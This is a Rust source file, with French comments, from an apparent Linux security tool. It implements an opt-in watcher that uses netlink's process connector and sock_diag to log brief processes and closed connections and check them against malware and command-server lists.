//! Le veilleur : ce qui se passe entre deux passes de la surveillance horaire. La surveillance prend une photo par
//! heure ; un programme ou une connexion qui vit moins d'une heure entre deux photos n'y est jamais vu. Le veilleur
//! écoute deux flux que le noyau Linux ouvre aux comptes ordinaires, sans root ni eBPF, et sans aucun code chargé dans
//! le noyau :
//! - le connecteur de processus (NETLINK_CONNECTOR, groupe CN_IDX_PROC ; Linux 6.6 et plus sans droits) : chaque
//!   fork, exec et fin de processus, de tous les comptes, même de quelques millisecondes ;
//! - les fins de prises de sock_diag (groupes « destroy ») : chaque connexion TCP ou UDP au moment où elle se ferme,
//!   adresses et ports, même brève.
//!
//! Ce qu'il ne voit pas, et dit tel quel : l'événement de lancement ne porte que le numéro du processus, et un
//! programme de quelques millisecondes peut être parti avant qu'on lise /proc (il est compté « parti », jamais jugé
//! sain) ; le programme d'une connexion fermée n'est jamais connu (le noyau ne donne ni le compte ni la prise à ce
//! moment-là).
//!
//! Il observe seulement : rien n'est arrêté ni envoyé. Les programmes sont jugés par la voie des sources de menaces
//! (`protection::sources` : les empreintes récentes de MalwareBazaar, puis les fonctions de COM-PRG-001), les connexions par les serveurs de commande des listes déjà téléchargées ; ce qui
//! est grave va au journal du tableau de bord et en notification, à débit borné. Il ne lit, de chaque processus, que
//! `/proc/<pid>/exe`, cmdline et status : jamais les fichiers des agents d'IA (conversations, history.jsonl,
//! shell-snapshots), ni rien d'autre de leur dossier.
//!
//! Le service est une unité systemd de l'utilisateur, Type=simple, coupée par défaut et posée seulement après accord
//! (`vanguard veilleur on`) ; `vanguard veilleur off` la retire exactement.

use std::collections::{HashMap, HashSet, VecDeque};
use std::io::{IsTerminal, Read};
use std::net::{IpAddr, SocketAddr};
use std::path::PathBuf;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::{Duration, Instant};

use crate::langue::Reponse;
use crate::machine::chasse::{self, EnMarche};
use crate::machine::regles::{Os, regle};
use crate::machine::{Constat, alerte, impossible, ok};
use crate::protection::rancongiciel::score::{self, Copies, Verdict};
use crate::protection::rancongiciel::{Reglages, attribution::Attribution, reponse, veille};
use crate::protection::sortantes::ServeursDeCommande;
use crate::reseau::tableau::{self, Genre};
use crate::risk::Niveau;
use crate::ui::{GRIS, RESET, VERT, afficher_aligne, couleur, demander, titre};
use crate::voulues::{self, Defense};
use crate::{tr, trf, trp};

regle!(
    "LNX-SUR-001",
    Os::Linux,
    380,
    (
        "veilleur des lancements et des connexions",
        "watcher of launches and connections"
    ),
    &["CIS Controls v8 8.8"],
    || vec![constat()]
);

/// Le nom de l'unité de l'utilisateur.
pub(crate) const UNITE: &str = "vanguard-veilleur.service";
/// L'état que le service réécrit dans le dossier de données, et la note du choix de la personne : la désinstallation
/// les garde si le veilleur reste alors que le dossier part.
pub(crate) const ETAT: &str = crate::sceau::VEILLEUR_ETAT;
pub(crate) const VOULU: &str = "veilleur-voulu";
/// La note du choix de surveiller aussi les dossiers personnels contre les rançongiciels (accord séparé, dans le même
/// « on » que le veilleur) : présent = la veille anti-rançongiciel est voulue.
pub(crate) const RANCON_VOULU: &str = "rancongiciel-voulu";
/// La sortie d'un refus (noyau trop ancien, abonnement refusé, root) : l'unité ne le relance pas
/// (RestartPreventExitStatus), puisque relancer n'y changerait rien.
const SORTIE_REFUS: i32 = 77;

// ───────────────────────────── Décodage, pur ─────────────────────────────

const NETLINK_CONNECTOR: i32 = 11;
const NETLINK_SOCK_DIAG: i32 = 4;
const CN_IDX_PROC: u32 = 1;
const CN_VAL_PROC: u32 = 1;
const NLMSG_DONE: u16 = 3;
const PROC_CN_MCAST_LISTEN: u32 = 1;
const PROC_CN_MCAST_IGNORE: u32 = 2;
const PROC_EVENT_NONE: u32 = 0;
const PROC_EVENT_FORK: u32 = 1;
const PROC_EVENT_EXEC: u32 = 2;
const PROC_EVENT_EXIT: u32 = 0x8000_0000;
const SOCK_DIAG_BY_FAMILY: u16 = 20;
const INET_DIAG_PROTOCOL: u16 = 10;
/// Les quatre groupes « destroy » de sock_diag : TCP et UDP, IPv4 et IPv6.
const GROUPES_FINS_DE_PRISES: u32 = 0xF;
const AF_INET: u8 = 2;
const AF_INET6: u8 = 10;

/// La demande d'abonnement (`PROC_CN_MCAST_LISTEN`) ou de désabonnement (`PROC_CN_MCAST_IGNORE`) au connecteur de
/// processus : en-tête netlink (16 octets), cn_msg (20), puis l'opération sur 4 octets. Pas la forme à 8 octets avec
/// un filtre : le filtre jette aussi l'accusé (relevé), et l'abonnement ne se prouverait plus. `jeton` va dans les
/// numéros et dans le champ ack de cn_msg : le noyau renvoie ack + 1 dans son accusé.
fn demande_abonnement(op: u32, jeton: u32) -> [u8; 40] {
    let mut d = [0u8; 40];
    d[0..4].copy_from_slice(&40u32.to_ne_bytes());
    d[4..6].copy_from_slice(&NLMSG_DONE.to_ne_bytes());
    d[8..12].copy_from_slice(&jeton.to_ne_bytes());
    d[16..20].copy_from_slice(&CN_IDX_PROC.to_ne_bytes());
    d[20..24].copy_from_slice(&CN_VAL_PROC.to_ne_bytes());
    d[24..28].copy_from_slice(&jeton.to_ne_bytes());
    d[28..32].copy_from_slice(&jeton.to_ne_bytes());
    d[32..34].copy_from_slice(&4u16.to_ne_bytes());
    d[36..40].copy_from_slice(&op.to_ne_bytes());
    d
}

/// Un événement du connecteur de processus.
#[derive(Debug, Clone, PartialEq, Eq)]
enum EvenementProc {
    /// La réponse à une demande d'abonnement : son numéro (celui du compteur du noyau, pas le nôtre), `ack` (le
    /// nôtre plus un) et l'erreur du noyau.
    Accuse { seq: u32, ack: u32, err: u32 },
    /// Un processus en a créé un autre (les fils d'un même processus sont laissés de côté).
    Fourche { parent: u32, enfant: u32 },
    /// Un processus a lancé un programme (exec).
    Lancement { pid: u32 },
    /// Un processus s'est terminé ; `parent` quand le noyau le donne.
    Fin { pid: u32, parent: Option<u32>, code: u32 },
    /// Le reste (changement de compte, de nom, copie de mémoire…) : rien à en faire ici.
    Autre,
}

fn u32_a(octets: &[u8], pos: usize) -> Option<u32> {
    Some(u32::from_ne_bytes(octets.get(pos..pos + 4)?.try_into().ok()?))
}

/// Les événements d'un morceau reçu du connecteur. Chaque message : nlmsghdr de type NLMSG_DONE, cn_msg (idx et val à
/// 1, puis seq, ack, longueur des données) et proc_event (what, cpu, horodatage, puis les données propres à
/// l'événement, à 16 octets de son début). Un message tronqué ou étranger est ignoré, jamais deviné.
fn lire_evenements_proc(octets: &[u8]) -> Vec<EvenementProc> {
    let mut evenements = Vec::new();
    for (genre, corps) in crate::reseau::scan::messages_netlink(octets) {
        if genre != NLMSG_DONE {
            continue;
        }
        // Les 20 octets d'en-tête en tableau : des indices constants, que le compilateur sait dans les bornes.
        let Some(tete) = corps.first_chunk::<20>() else {
            continue;
        };
        let (Some(idx), Some(val), Some(seq), Some(ack)) =
            (u32_a(corps, 0), u32_a(corps, 4), u32_a(corps, 8), u32_a(corps, 12))
        else {
            continue;
        };
        let longueur = usize::from(u16::from_ne_bytes([tete[16], tete[17]]));
        if idx != CN_IDX_PROC || val != CN_VAL_PROC {
            continue;
        }
        let Some(donnees) = corps.get(20..20 + longueur) else {
            continue;
        };
        let Some(what) = u32_a(donnees, 0) else {
            continue;
        };
        let champ = |pos: usize| u32_a(donnees, 16 + pos);
        let evenement = match what {
            PROC_EVENT_NONE => champ(0).map(|err| EvenementProc::Accuse { seq, ack, err }),
            PROC_EVENT_FORK => match (champ(4), champ(8), champ(12)) {
                // Un fil (pid ≠ tgid) n'est pas un nouveau processus.
                (Some(parent), Some(pid), Some(tgid)) if pid == tgid => {
                    Some(EvenementProc::Fourche { parent, enfant: tgid })
                }
                (Some(_), Some(_), Some(_)) => Some(EvenementProc::Autre),
                _ => None,
            },
            PROC_EVENT_EXEC => champ(4).map(|pid| EvenementProc::Lancement { pid }),
            PROC_EVENT_EXIT => match (champ(0), champ(4), champ(8)) {
                (Some(pid), Some(tgid), Some(code)) if pid == tgid => Some(EvenementProc::Fin {
                    pid,
                    parent: champ(20).filter(|&p| p != 0),
                    code,
                }),
                (Some(_), Some(_), Some(_)) => Some(EvenementProc::Autre),
                _ => None,
            },
            _ => Some(EvenementProc::Autre),
        };
        evenements.extend(evenement);
    }
    evenements
}

/// Une prise TCP ou UDP qui vient de se fermer. `locale` est toujours le côté de cet ordinateur.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct FinPrise {
    /// 6 (TCP) ou 17 (UDP) ; `None` si le noyau ne l'a pas dit.
    pub protocole: Option<u8>,
    pub locale: SocketAddr,
    pub distante: SocketAddr,
    pub etat: u8,
}

/// Les fins de prises d'un morceau reçu de sock_diag : inet_diag_msg (72 octets : famille, état, ports dans l'ordre
/// du réseau, adresses sur 16 octets…) puis ses attributs, dont le protocole. Une adresse IPv4 vue par une prise
/// IPv6 (« ::ffff:192.0.2.1 ») est ramenée à sa forme IPv4, celle des listes.
fn lire_fins_de_prises(octets: &[u8]) -> Vec<FinPrise> {
    let mut fins = Vec::new();
    for (genre, corps) in crate::reseau::scan::messages_netlink(octets) {
        if genre != SOCK_DIAG_BY_FAMILY {
            continue;
        }
        // Les 72 premiers octets en tableau : des indices constants, que le compilateur sait dans les bornes.
        let Some(tete) = corps.first_chunk::<72>() else {
            continue;
        };
        // Le champ d'adresse fait 16 octets ; une IPv4 en occupe les 4 premiers.
        let adresse = |champ: &[u8]| -> Option<IpAddr> {
            match tete[0] {
                AF_INET => Some(IpAddr::from(*champ.first_chunk::<4>()?)),
                AF_INET6 => Some(IpAddr::from(<[u8; 16]>::try_from(champ).ok()?).to_canonical()),
                _ => None,
            }
        };
        let (Some(source), Some(destination)) = (adresse(&tete[8..24]), adresse(&tete[24..40])) else {
            continue;
        };
        let mut protocole = None;
        let mut pos = 72;
        while let Some(&[l0, l1, g0, g1]) = corps.get(pos..).and_then(|r| r.first_chunk::<4>()) {
            let longueur = usize::from(u16::from_ne_bytes([l0, l1]));
            if longueur < 4 {
                break;
            }
            if u16::from_ne_bytes([g0, g1]) == INET_DIAG_PROTOCOL && longueur >= 5 {
                protocole = corps.get(pos + 4).copied();
            }
            pos += longueur.next_multiple_of(4);
        }
        fins.push(FinPrise {
            protocole,
            locale: SocketAddr::new(source, u16::from_be_bytes([tete[4], tete[5]])),
            distante: SocketAddr::new(destination, u16::from_be_bytes([tete[6], tete[7]])),
            etat: tete[1],
        });
    }
    fins
}

/// La version du noyau (« 6.10.2-arch1-1 ») suffit-elle ? Linux 6.6 est le premier qui ouvre le connecteur de
/// processus aux comptes ordinaires. `None` : version illisible.
fn noyau_suffisant(release: &str) -> Option<bool> {
    let mut morceaux = release.trim().split('.');
    let nombre = |m: Option<&str>| -> Option<u32> {
        let m = m?;
        let fin = m.find(|c: char| !c.is_ascii_digit()).unwrap_or(m.len());
        m[..fin].parse().ok()
    };
    let majeur = nombre(morceaux.next())?;
    let mineur = nombre(morceaux.next())?;
    Some((majeur, mineur) >= (6, 6))
}

fn release_du_noyau() -> Option<String> {
    std::fs::read_to_string("/proc/sys/kernel/osrelease")
        .ok()
        .map(|r| r.trim().to_string())
}

/// La ligne de commande de `/proc/<pid>/cmdline` : ses morceaux séparés par NUL, joints par une espace, comme la chasse
/// les lit. `None` : vide (processus terminé, ou fil du noyau).
fn ligne_de_commande(octets: &[u8]) -> Option<String> {
    let ligne = octets
        .split(|&b| b == 0)
        .filter(|m| !m.is_empty())
        .map(String::from_utf8_lossy)
        .collect::<Vec<_>>()
        .join(" ");
    (!ligne.is_empty()).then_some(ligne)
}

/// Ce qu'on a pu lire d'un programme au moment de son lancement.
#[derive(Debug, Clone)]
pub(crate) enum Lecture {
    /// Son programme ou sa ligne de commande (ceux d'un autre compte : la ligne seule).
    Complet(EnMarche),
    /// Seulement son nom court, donné par le noyau (programme déjà terminé, pas encore ramassé par son parent).
    NomSeul(EnMarche),
    /// Plus rien : parti avant qu'on le lise. Jamais jugé, jamais compté comme sain.
    Parti,
    /// Pas lu du tout : une rafale de lancements (plus de `LECTURES_PAR_SECONDE`).
    NonLu,
}

/// La lecture d'un processus, d'après ce que /proc a rendu : le lien exe, cmdline et status. Un processus terminé
/// mais pas encore ramassé (« zombie ») n'a plus ni programme ni ligne de commande, mais encore son nom.
fn lecture_de(pid: u32, exe: Option<String>, cmdline: Option<&[u8]>, status: Option<&str>) -> Lecture {
    let champ = |nom: &str| status.and_then(|s| s.lines().find_map(|l| l.strip_prefix(nom)).map(str::trim));
    let nom = champ("Name:").map(str::to_string);
    let parent = champ("PPid:").and_then(|p| p.parse().ok()).filter(|&p: &u32| p != 0);
    let zombie = champ("State:").is_some_and(|e| e.starts_with('Z') || e.starts_with('X'));
    let ligne = cmdline.and_then(ligne_de_commande);
    let nom_seul = |nom: String| {
        Lecture::NomSeul(EnMarche {
            pid,
            parent,
            nom,
            ..EnMarche::default()
        })
    };
    if zombie || (ligne.is_none() && exe.is_none()) {
        return nom.map_or(Lecture::Parti, nom_seul);
    }
    let sans_fichier = exe.as_deref().is_some_and(|l| l.ends_with(" (deleted)"));
    let chemin = exe.map(|l| l.strip_suffix(" (deleted)").map_or_else(|| l.clone(), str::to_string));
    let nom = nom.unwrap_or_else(|| {
        let premier = chemin
            .as_deref()
            .or_else(|| ligne.as_deref().and_then(|l| l.split_whitespace().next()))
            .unwrap_or("");
        chasse::nom_de_fichier(premier).to_string()
    });
    Lecture::Complet(EnMarche {
        pid,
        parent,
        nom,
        chemin,
        ligne,
        sans_fichier,
        ne: None,
    })
}

// ───────────────────────────── Table des processus, bornée ─────────────────────────────

/// Au plus tant de processus connus (environ 1 Mio) : au-delà, les disparus sont balayés, puis les plus anciens
/// oubliés. Un ordinateur de maison en a quelques centaines.
const TABLE_MAX: usize = 16_384;
/// Ce qui reste au plus après un balayage de la table pleine : 7/8. Le balayage suivant n'a lieu qu'après au moins
/// TABLE_MAX/8 nouvelles fiches, même quand tous les processus vivent (une fork bomb) ; sinon chaque fourche coûterait
/// un stat par fiche, 16 384, et le veilleur prendrait un retard sans fin.
const TABLE_APRES_BALAYAGE: usize = TABLE_MAX / 8 * 7;
/// Un nom de processus du noyau fait 15 octets ; on en garde 16 au plus, contre un nom fabriqué.
const NOM_MAX: usize = 16;
/// La lignée montrée : le programme et trois ancêtres au plus (« npm → node → sh »).
const LIGNEE_MAX: usize = 4;
/// Les parents remontés au plus pour reconnaître Vanguard : une lignée plus longue n'est pas de lui.
const CHAINE_MAX: usize = 64;

#[derive(Debug, Clone)]
struct Fiche {
    parent: Option<u32>,
    nom: String,
    /// Vanguard lui-même (son programme, ou le veilleur) : une racine. La marque ne passe pas aux enfants : un
    /// descendant est « de Vanguard » tant que la chaîne de ses parents connus mène à une racine encore là.
    racine: bool,
    /// Son numéro d'entrée, pour que l'éviction des plus anciens ne retire pas une fiche reprise depuis.
    entree: u64,
}

/// Ce que le veilleur sait des processus : de quoi remonter une lignée et reconnaître Vanguard. Bornée.
#[derive(Debug, Default)]
struct Table {
    fiches: HashMap<u32, Fiche>,
    ordre: VecDeque<(u32, u64)>,
    entrees: u64,
}

fn nom_borne(nom: &str) -> String {
    let mut fin = nom.len().min(NOM_MAX);
    while !nom.is_char_boundary(fin) {
        fin -= 1;
    }
    nom[..fin].to_string()
}

impl Table {
    fn inserer(&mut self, pid: u32, parent: Option<u32>, nom: &str, racine: bool, vivant: &dyn Fn(u32) -> bool) {
        if !self.fiches.contains_key(&pid) && self.fiches.len() >= TABLE_MAX {
            self.faire_de_la_place(vivant);
        }
        self.entrees += 1;
        self.fiches.insert(
            pid,
            Fiche {
                parent,
                nom: nom_borne(nom),
                racine,
                entree: self.entrees,
            },
        );
        self.ordre.push_back((pid, self.entrees));
        // L'ordre garde aussi les entrées retirées depuis : il est refait quand il devient deux fois trop long.
        if self.ordre.len() > 2 * TABLE_MAX {
            let fiches = &self.fiches;
            self.ordre
                .retain(|(p, entree)| fiches.get(p).is_some_and(|f| f.entree == *entree));
        }
    }

    /// La table est pleine : les disparus sont balayés, puis, si elle reste au-dessus de 7/8, les plus anciens sont
    /// oubliés d'un coup jusqu'à 7/8. Les racines (Vanguard) passent leur tour ; elles ne sont oubliées qu'en dernier
    /// recours, si la table n'était faite que d'elles.
    fn faire_de_la_place(&mut self, vivant: &dyn Fn(u32) -> bool) {
        self.fiches.retain(|&p, _| vivant(p));
        let mut a_voir = self.ordre.len();
        while self.fiches.len() > TABLE_APRES_BALAYAGE && a_voir > 0 {
            a_voir -= 1;
            let Some((p, entree)) = self.ordre.pop_front() else {
                break;
            };
            match self.fiches.get(&p) {
                Some(f) if f.entree == entree && f.racine => self.ordre.push_back((p, entree)),
                Some(f) if f.entree == entree => {
                    self.fiches.remove(&p);
                }
                _ => {}
            }
        }
        while self.fiches.len() >= TABLE_MAX {
            let Some((p, entree)) = self.ordre.pop_front() else {
                break;
            };
            if self.fiches.get(&p).is_some_and(|f| f.entree == entree) {
                self.fiches.remove(&p);
            }
        }
    }

    fn fourche(&mut self, parent: u32, enfant: u32, vivant: &dyn Fn(u32) -> bool) {
        let nom = self.fiches.get(&parent).map(|f| f.nom.clone()).unwrap_or_default();
        self.inserer(enfant, Some(parent), &nom, false, vivant);
    }

    /// Un lancement : le nom et le parent lus (s'ils l'ont été), et `racine` si le programme est celui de Vanguard.
    /// Rien n'est repris de la marque d'avant : un processus qui lance autre chose que Vanguard n'est plus une racine.
    fn lancement(&mut self, pid: u32, lu: Option<&EnMarche>, racine: bool, vivant: &dyn Fn(u32) -> bool) {
        let ancienne = self.fiches.get(&pid).cloned();
        let parent = lu.and_then(|p| p.parent).or(ancienne.as_ref().and_then(|f| f.parent));
        let nom = lu.map_or_else(
            || ancienne.as_ref().map(|f| f.nom.clone()).unwrap_or_default(),
            |p| p.nom.clone(),
        );
        match self.fiches.get_mut(&pid) {
            Some(f) => {
                f.parent = parent;
                f.nom = nom_borne(&nom);
                f.racine = racine;
            }
            None => self.inserer(pid, parent, &nom, racine, vivant),
        }
    }

    fn fin(&mut self, pid: u32) {
        self.fiches.remove(&pid);
    }

    /// Vanguard, ou lancé par lui : la chaîne des parents connus mène à une racine encore là (`CHAINE_MAX` maillons
    /// au plus, arrêtée sur une boucle). La fin d'un intermédiaire retire sa fiche et coupe la chaîne : le navigateur
    /// ouvert par Vanguard (par xdg-open), rattaché ailleurs quand xdg-open se termine, est alors jugé, comme le
    /// bilan le juge sur l'arbre du moment.
    fn de_vanguard(&self, pid: u32) -> bool {
        let mut vus = HashSet::new();
        let mut courant = Some(pid);
        while let Some(p) = courant
            && vus.len() < CHAINE_MAX
            && vus.insert(p)
        {
            let Some(f) = self.fiches.get(&p) else {
                return false;
            };
            if f.racine {
                return true;
            }
            courant = f.parent;
        }
        false
    }

    fn parent(&self, pid: u32) -> Option<u32> {
        self.fiches.get(&pid).and_then(|f| f.parent)
    }

    /// Les noms de la lignée, de l'ancêtre au programme : quatre au plus, arrêtée sur une boucle de parents.
    fn lignee(&self, pid: u32) -> Vec<String> {
        let mut noms = Vec::new();
        let mut vus = HashSet::new();
        let mut courant = Some(pid);
        while let Some(p) = courant
            && noms.len() < LIGNEE_MAX
            && vus.insert(p)
        {
            let Some(f) = self.fiches.get(&p) else { break };
            noms.push(if f.nom.is_empty() {
                format!("PID {p}")
            } else {
                f.nom.clone()
            });
            courant = f.parent;
        }
        noms.reverse();
        noms
    }
}

// ───────────────────────────── Prises netlink, par libc ─────────────────────────────

/// Pourquoi le veilleur ne peut pas s'ouvrir.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum Refus {
    /// Le connecteur n'existe pas ici (EPROTONOSUPPORT) : noyau sans CONFIG_PROC_EVENTS, ou espace réseau à part.
    Absent,
    /// Le noyau refuse sans droits (EPERM).
    Interdit,
    /// Aucun accusé de notre abonnement en 2 secondes, sans débordement : le noyau ne nous a pas pris.
    SansAccuse,
    /// Une cause passagère : l'accusé perdu dans un débordement du tampon, ou le noyau à court de mémoire (ENOMEM,
    /// EAGAIN dans l'accusé). Relancer peut suffire.
    Passager,
    /// L'arrêt demandé (SIGTERM, SIGINT) pendant l'ouverture.
    Arrete,
    Erreur(i32),
}

impl Refus {
    pub(crate) fn raison(&self) -> String {
        match self {
            Refus::Absent => tr!(
                "Ce noyau n'a pas le connecteur de processus (CONFIG_PROC_EVENTS), ou il n'existe pas ici (espace réseau à part) : rien n'est installé.",
                "This kernel has no process connector (CONFIG_PROC_EVENTS), or it does not exist here (separate network namespace): nothing is installed."
            )
            .to_string(),
            Refus::Interdit => tr!(
                "Le noyau refuse l'abonnement au connecteur de processus sans droits (EPERM) : rien n'est installé ; Vanguard ne le demandera pas en root.",
                "The kernel refuses the process connector subscription without rights (EPERM): nothing is installed; Vanguard will not ask for it as root."
            )
            .to_string(),
            Refus::SansAccuse => tr!(
                "Le noyau n'a pas confirmé l'abonnement en 2 secondes (conteneur, espace de noms ?) : rien n'est installé. Ce qui arriverait quand même viendrait d'un autre abonné et ne se compte pas.",
                "The kernel did not confirm the subscription within 2 seconds (container, namespace?): nothing is installed. Whatever still arrived would come from another subscriber and does not count."
            )
            .to_string(),
            Refus::Passager => tr!(
                "Le noyau n'a pas pu confirmer l'abonnement, pour une cause passagère (son tampon a débordé, ou il manquait de mémoire) : rien n'est installé ; réessayez dans un instant.",
                "The kernel could not confirm the subscription, for a passing cause (its buffer overflowed, or it was short of memory): nothing is installed; try again in a moment."
            )
            .to_string(),
            Refus::Arrete => tr!(
                "Arrêt demandé pendant l'ouverture du veilleur : rien n'est installé.",
                "Stop requested while the watcher was opening: nothing is installed."
            )
            .to_string(),
            Refus::Erreur(e) => trf!(
                "Le connecteur de processus ne s'ouvre pas ({}) : rien n'est installé.",
                "The process connector does not open ({}): nothing is installed.",
                std::io::Error::from_raw_os_error(*e)
            ),
        }
    }

    fn depuis_errno(e: i32) -> Refus {
        match e {
            // ECONNREFUSED : la prise s'ouvre, mais aucun connecteur n'y répond (un espace réseau à part, celui
            // de `unshare -rn`).
            libc::EPROTONOSUPPORT | libc::ECONNREFUSED => Refus::Absent,
            libc::EPERM | libc::EACCES => Refus::Interdit,
            e => Refus::Erreur(e),
        }
    }

    /// La sortie du service sur ce refus. 77, que l'unité ne relance jamais, seulement quand relancer n'y changerait
    /// rien (pas de connecteur, abonnement interdit, noyau qui ne nous prend pas) ; une cause passagère ou imprévue
    /// sort en 1 pour que systemd relance (StartLimitBurst borne les relances) ; l'arrêt demandé sort en 0.
    fn sortie(&self) -> i32 {
        match self {
            Refus::Absent | Refus::Interdit | Refus::SansAccuse => SORTIE_REFUS,
            Refus::Passager | Refus::Erreur(_) => 1,
            Refus::Arrete => 0,
        }
    }
}

/// Ce que dit l'erreur rendue par le noyau dans l'accusé de notre abonnement. ENOMEM et EAGAIN sont passagers
/// (l'état de l'abonnement n'a pas pu être alloué) : jamais un refus définitif.
fn resultat_de_l_accuse(err: u32) -> Result<(), Refus> {
    match i32::try_from(err).unwrap_or(-1) {
        0 => Ok(()),
        libc::EPERM | libc::EACCES => Err(Refus::Interdit),
        libc::ENOMEM | libc::EAGAIN | libc::ENOBUFS => Err(Refus::Passager),
        e => Err(Refus::Erreur(e)),
    }
}

fn errno() -> i32 {
    std::io::Error::last_os_error().raw_os_error().unwrap_or(0)
}

/// Une prise netlink à nous, fermée une seule fois quand elle disparaît.
struct Prise(i32);

impl Drop for Prise {
    fn drop(&mut self) {
        // SAFETY : le descripteur a été ouvert par `ouvrir_prise` et n'est fermé qu'ici, une fois.
        unsafe {
            libc::close(self.0);
        }
    }
}

/// La prise du connecteur, dès que la demande d'abonnement est partie : le désabonnement part quand elle disparaît,
/// même si l'ouverture du veilleur échoue ensuite (accusé manquant, arrêt demandé). Sans lui, le noyau compterait un
/// abonné de trop jusqu'au redémarrage (fermer la prise ne le décompte pas) et continuerait de préparer un message
/// par fork, exec et fin du système. Un désabonnement que le noyau n'avait pas compté ne décompte rien : il tient
/// l'état de l'abonnement par prise.
struct Abonnement(Prise);

impl Drop for Abonnement {
    fn drop(&mut self) {
        let _ = envoyer(&self.0, &demande_abonnement(PROC_CN_MCAST_IGNORE, jeton_d_abonnement()));
    }
}

/// Le tampon de réception demandé : une rafale de lancements (une compilation) en remplit vite un petit. Sans droits,
/// le noyau le plafonne (rmem_max) ; la taille obtenue est relue et notée.
const TAMPON_VOULU: i32 = 4 << 20;

fn adresse_netlink(groupes: u32) -> libc::sockaddr_nl {
    // SAFETY : sockaddr_nl est une structure C sans pointeur, valide remplie de zéros (son bourrage est privé).
    let mut adresse: libc::sockaddr_nl = unsafe { std::mem::zeroed() };
    #[allow(clippy::cast_possible_truncation, clippy::cast_sign_loss)]
    {
        adresse.nl_family = libc::AF_NETLINK as u16;
    }
    adresse.nl_groups = groupes;
    adresse
}

fn taille_de<T>() -> libc::socklen_t {
    libc::socklen_t::try_from(std::mem::size_of::<T>()).unwrap_or(0)
}

/// Une prise netlink du protocole donné, abonnée aux `groupes`. On ne pose jamais NETLINK_NO_ENOBUFS : il cacherait
/// les pertes, qu'on veut compter.
fn ouvrir_prise(protocole: i32, groupes: u32) -> Result<Prise, Refus> {
    // SAFETY : socket ne prend que des entiers ; le descripteur rendu est confié à `Prise`, qui le fermera.
    let fd = unsafe { libc::socket(libc::AF_NETLINK, libc::SOCK_DGRAM | libc::SOCK_CLOEXEC, protocole) };
    if fd < 0 {
        return Err(Refus::depuis_errno(errno()));
    }
    let prise = Prise(fd);
    let adresse = adresse_netlink(groupes);
    let voulu = TAMPON_VOULU;
    // SAFETY : chaque appel reçoit un pointeur vers une valeur à nous, vivante pendant l'appel, et sa taille exacte.
    let lie = unsafe {
        libc::setsockopt(
            fd,
            libc::SOL_SOCKET,
            libc::SO_RCVBUF,
            (&raw const voulu).cast(),
            taille_de::<i32>(),
        );
        libc::bind(fd, (&raw const adresse).cast(), taille_de::<libc::sockaddr_nl>())
    };
    if lie < 0 {
        return Err(Refus::depuis_errno(errno()));
    }
    Ok(prise)
}

/// La taille du tampon de réception obtenue (le noyau la double pour sa comptabilité, d'où ce qu'il rend).
fn tampon_obtenu(prise: &Prise) -> usize {
    let mut taille: i32 = 0;
    let mut longueur = taille_de::<i32>();
    // SAFETY : getsockopt écrit au plus `longueur` octets dans `taille`, à nous et vivante pendant l'appel.
    let r = unsafe {
        libc::getsockopt(
            prise.0,
            libc::SOL_SOCKET,
            libc::SO_RCVBUF,
            (&raw mut taille).cast(),
            &raw mut longueur,
        )
    };
    if r < 0 { 0 } else { usize::try_from(taille).unwrap_or(0) }
}

/// Envoie un message au noyau (adresse netlink 0).
fn envoyer(prise: &Prise, message: &[u8]) -> bool {
    let adresse = adresse_netlink(0);
    // SAFETY : le message et l'adresse sont à nous, vivants pendant l'appel, passés avec leur taille exacte.
    let envoye = unsafe {
        libc::sendto(
            prise.0,
            message.as_ptr().cast(),
            message.len(),
            0,
            (&raw const adresse).cast(),
            taille_de::<libc::sockaddr_nl>(),
        )
    };
    usize::try_from(envoye).ok() == Some(message.len())
}

enum Recu {
    Octets(usize),
    /// Le tampon a débordé (ENOBUFS) : des événements sont perdus.
    Perdus,
    /// Rien à lire pour l'instant (EAGAIN, EINTR).
    Vide,
    Erreur(i32),
}

fn recevoir(prise: &Prise, tampon: &mut [u8]) -> Recu {
    // SAFETY : recv écrit au plus `tampon.len()` octets dans le tampon, à nous ; MSG_DONTWAIT : jamais bloquant.
    let n = unsafe { libc::recv(prise.0, tampon.as_mut_ptr().cast(), tampon.len(), libc::MSG_DONTWAIT) };
    match usize::try_from(n) {
        Ok(0) => Recu::Vide,
        Ok(n) => Recu::Octets(n),
        Err(_) => match errno() {
            libc::ENOBUFS => Recu::Perdus,
            libc::EAGAIN | libc::EINTR => Recu::Vide,
            e => Recu::Erreur(e),
        },
    }
}

/// Attend qu'une des prises ait quelque chose à lire, `ms` millisecondes au plus ; rend, pour chacune, si elle a de
/// quoi lire (ou une erreur, un débordement par exemple, que recv dira).
fn attendre(prises: &[&Prise], ms: i32) -> Vec<bool> {
    let mut attentes: Vec<libc::pollfd> = prises
        .iter()
        .map(|p| libc::pollfd {
            fd: p.0,
            events: libc::POLLIN,
            revents: 0,
        })
        .collect();
    let nombre = libc::nfds_t::try_from(attentes.len()).unwrap_or(0);
    // SAFETY : poll lit et écrit `nombre` structures du vecteur, à nous et vivant pendant l'appel.
    let r = unsafe { libc::poll(attentes.as_mut_ptr(), nombre, ms) };
    attentes
        .iter()
        .map(|a| r > 0 && a.revents & (libc::POLLIN | libc::POLLERR) != 0)
        .collect()
}

/// Demandé par SIGTERM (systemctl stop) ou SIGINT : le service finit son tour, se désabonne et sort.
static ARRET: AtomicBool = AtomicBool::new(false);

extern "C" fn sur_signal(_: libc::c_int) {
    // Rien d'autre ici : seul un accès atomique est sûr dans un gestionnaire de signal.
    ARRET.store(true, Ordering::SeqCst);
}

fn arret_demande() -> bool {
    ARRET.load(Ordering::SeqCst)
}

/// Pose le gestionnaire de SIGTERM et SIGINT, et rend les actions d'avant (SIGTERM puis SIGINT) pour
/// `remettre_les_signaux` : hors du service, Ctrl-C doit retrouver son effet après l'essai d'abonnement.
fn ecouter_les_signaux() -> [libc::sigaction; 2] {
    // SAFETY : les structures sont remplies de zéros (valides pour sigaction) puis complétées (gestionnaire, masque
    // vide, aucun drapeau) ; sigaction écrit l'action d'avant dans `avant`, à nous et vivant pendant l'appel. Le
    // gestionnaire ne fait qu'écrire un booléen atomique, ce qui est sûr dans un signal.
    unsafe {
        let mut action: libc::sigaction = std::mem::zeroed();
        action.sa_sigaction = sur_signal as extern "C" fn(libc::c_int) as libc::sighandler_t;
        libc::sigemptyset(&raw mut action.sa_mask);
        let mut avant: [libc::sigaction; 2] = std::mem::zeroed();
        libc::sigaction(libc::SIGTERM, &raw const action, &raw mut avant[0]);
